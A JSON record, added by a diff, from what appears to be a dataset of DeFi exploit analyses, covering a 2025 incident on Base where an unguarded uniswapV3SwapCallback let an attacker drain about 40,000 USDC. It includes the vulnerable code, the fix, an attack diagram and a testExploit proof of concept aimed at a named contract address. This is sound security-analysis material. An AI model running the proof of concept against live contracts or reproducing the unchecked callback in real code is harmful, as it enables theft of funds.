@@ -1,0 +1,31 @@
+{
+ "id": "2025__2025-08-10_0x8d2e_MissingAccessControl-SwapCallback",
+ "source_file": "2025/2025-08-10_0x8d2e_MissingAccessControl-SwapCallback.md",
+ "title": "0x8d2e — UniswapV3 Swap Callback Missing Access Control Analysis",
+ "date": "2025-08-10",
+ "protocol": "0x8d2e",
+ "chain": "Base",
+ "loss_raw": "~40,000 USDC",
+ "loss_usd": null,
+ "root_cause": "`uniswapV3SwapCallback` function has no caller validation, allowing anyone to call it arbitrarily",
+ "attack_tx": "0x6be0c4b5...",
+ "vulnerable_contract": "0x8d2Ef0d39A438C3601112AE21701819E13c41288",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable pattern: no caller validation in callback function\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data  // ← attacker injects arbitrary address into data\n) external {\n    // Does not verify whether msg.sender is an actual UniswapV3 pool!\n    (address token, address recipient) = abi.decode(data, (address, address));\n    IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));\n}\n\n//",
+  "// Reconstructed from PoC — NOT verified source\n// ❌ 0x8d2Ef0d39A438C3601112AE21701819E13c41288 — uniswapV3SwapCallback with no caller check\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external {\n    // ❌ No check that msg.sender is a legitimate UniswapV3 pool\n    // ❌ No check that a swap is in progress (no lock/flag)\n    // ❌ Arbitrary `data` decoded and used directly\n    (address token, address recipient) = abi.decode(data, (address, address));\n    // Transfers entire token balance to attacker-supplied `recipient`\n    IERC20(token).transfer(recipient, IERC20(token).balanceOf(address(this)));\n    // ^ attacker passes token=USDC, recipient=attacker → drains 40,000 USDC in one call\n}"
+ ],
+ "code_after": [
+  "✅ Fix: verify that the caller is a legitimate UniswapV3 pool\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external {\n    // Must verify that the address invoking this callback is an authorized UniswapV3 pool\n    require(msg.sender == address(expectedPool), \"unauthorized caller\");\n    ...\n}",
+  "// ✅ Fix: validate the caller is a registered pool before executing any transfer\naddress private immutable expectedPool; // set in constructor\n\nfunction uniswapV3SwapCallback(\n    int256 amount0Delta,\n    int256 amount1Delta,\n    bytes calldata data\n) external {\n    require(msg.sender == expectedPool, \"unauthorized: not a registered pool\"); // ✅ caller check\n    // optional: also verify a swap-in-progress flag set by the initiating function\n    ...\n}"
+ ],
+ "steps": [
+  "No access control → executes immediately"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─[1]─▶ Check victim contract's USDC balance\n  │         IERC20(USDC).balanceOf(VICTIM) = 40,000 USDC\n  │\n  ├─[2]─▶ Encode data: (USDC address, attacker address)\n  │\n  ├─[3]─▶ Directly call VICTIM.uniswapV3SwapCallback(balance, 0, data)\n  │         └─ No access control → executes immediately\n  │\n  └─[4]─▶ VICTIM transfers 40,000 USDC to attacker\n              └─ Completed in a single transaction",
+  "function testExploit() public balanceLog {\n    // [1] Query the victim contract's total USDC balance\n    uint256 balance = IERC20(USDC_ADDR).balanceOf(VICTIM);\n\n    // [2] Encode data: token = USDC, recipient = attacker (this)\n    bytes memory data = abi.encode(USDC_ADDR, address(this));\n\n    // [3] Directly call uniswapV3SwapCallback\n    // This function should only be called by a UniswapV3 pool,\n    // but due to missing access control, anyone can call it\n    IVictim(VICTIM).uniswapV3SwapCallback(\n        int256(balance),  // amount0Delta: amount to transfer\n        0,                // amount1Delta: unused\n        data              // recipient = attacker\n    );\n    // → VICTIM immediately transfers 40,000 USDC to the attacker\n}"
+ ]
+}
